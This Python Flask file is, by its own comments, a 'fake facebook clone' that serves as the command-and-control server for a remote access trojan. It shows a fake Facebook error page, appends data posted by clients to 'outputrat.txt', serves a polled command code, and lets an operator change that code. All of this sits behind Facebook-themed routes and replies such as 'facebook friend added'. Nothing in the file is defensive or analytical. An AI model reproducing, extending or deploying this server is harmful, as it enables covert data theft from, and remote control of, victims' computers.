from flask import Flask, jsonify, abort, request, make_response, url_for, render_template

app = Flask(__name__)

#COMMAND VARIABLE
#Start as statuscode 89 --> wait for command
VARx = 98;

#Flask server with a fake facebook clone

@app.route('/')
def hello():
    return "Facebook could not load correcly, please try again in 5 minutes or click here: https://www.facebook.com/"


@app.route('/facebook', methods=['POST'])
def create_data():
    with open("outputrat.txt", "a+") as output:
        output.seek(0)
        data = output.read(100)
        if len(data) > 0 :
            output.write("\n")
        for key, value in request.form.to_dict().items() :
            output.write(str(key))
    return "facebook friend added"


#This method displays the current statuscode
@app.route('/facebookfriends', methods=['GET'])
def GETCOMMAND():
    return str(VARx);


#SHOW STATUS CODE & FORM TO CHANGE STATUSCODE
@app.route('/changeFacebookFriends',methods = ['GET'])
def get_varx_template():
    return render_template('changeFacebookFriends.html',VARx=VARx)


#POST: Change the STATUS variable
@app.route('/FacebookAddStatusFriend', methods=['POST'])
def change_varx_by_client_code98():
    if request.method == 'POST':
        for key, value in request.form.to_dict().items() :
            var_x_Value = key
        global VARx
        VARx = int(var_x_Value);
        return "facebook friend added"
    else:
        return "error"


#POST: Change the STATUS variable
@app.route('/FacebookAddStatus', methods=['POST'])
def change_varx():
    if request.method == 'POST':
        var_x_Value = request.form['var_x_Value']
        global VARx
        VARx = int(var_x_Value);
        return "facebook friend added"
    else:
        return "error"


if __name__ == '__main__':
    app.run()